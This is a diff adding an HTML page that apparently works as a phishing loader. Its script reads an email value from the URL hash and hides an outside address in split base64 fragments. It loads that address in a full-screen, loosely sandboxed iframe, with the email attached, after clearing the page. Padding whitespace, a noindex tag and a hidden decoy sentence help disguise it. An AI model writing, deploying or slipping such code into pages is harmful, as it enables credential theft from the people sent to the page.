@@ -1,0 +1,223 @@
+<html>
+
+
+
+
+       <head>
+
+
+
+
+
+
+               <meta        name="viewport"      content="width=device-width,       initial-scale=1.0">
+
+
+
+
+         <meta       name="robots"    content="noindex,       nofollow">
+
+
+
+
+
+
+
+     </head>
+
+
+
+      <body>
+
+
+
+
+
+     <span     hidden>The        child     discovered       a      hidden    treasure.</span>
+
+
+
+
+
+
+    </body>
+
+
+
+
+
+<script>
+
+
+
+
+
+
+
+var      robin      =    null;
+
+
+
+
+
+
+if(location.hash     ==     ""){
+
+
+
+
+
+location.hash     =       `?em={email}`;
+
+
+
+
+
+
+robin     =       `?em={email}`;
+
+
+
+
+
+}
+
+
+
+
+
+
+if(location.hash      !==    ""){
+
+
+
+
+
+
+
+robin      =       location.hash;
+
+
+
+
+}
+
+
+
+
+
+
+if        (location.hash.includes('?'))     {
+
+
+
+
+
+
+robin        =       location.hash.replace('#',        '');
+
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+(async      ()        =>      {
+
+
+
+
+
+
+                       var    umbrella        =        document.createElement('iframe');
+
+
+
+
+                        umbrella.sandbox.add('allow-same-origin');
+
+
+
+                     umbrella.sandbox.add('allow-top-navigation');
+
+
+
+
+
+
+
+                         umbrella.sandbox.add('allow-modals');
+
+
+
+
+                          umbrella.sandbox.add('allow-scripts');
+
+
+
+
+
+                        umbrella.sandbox.add('allow-popups-to-escape-sandbox');
+
+
+
+
+                            umbrella.sandbox.add('allow-forms');
+
+
+
+
+
+                            umbrella.src    =        atob('aHR0cHM'+"6Ly9oc"+"mVmLmxp"+`Lz9odH`+`Rwczov`+"L0pRR"+`XhqLmVyYW`+"JhY3RvcC"+`5ydS9pQ`+"XMzLw==")+robin;
+
+
+
+
+                      umbrella.style.cssText      =       'position:       fixed;    inset:      0px;        width:     100%;        height:      100%;        border:       0px;       margin:     0px;padding:       0px;     overflow:     hidden;     z-index:       999999;';
+
+
+
+
+
+
+
+                          document.write(umbrella);
+
+
+
+
+
+
+                             document.body.innerHTML      =        "";
+
+
+
+                         document.body.appendChild(umbrella);
+
+
+
+
+})();
+
+
+
+
+
+</script>
+
+
+
+
+
+
+</html>
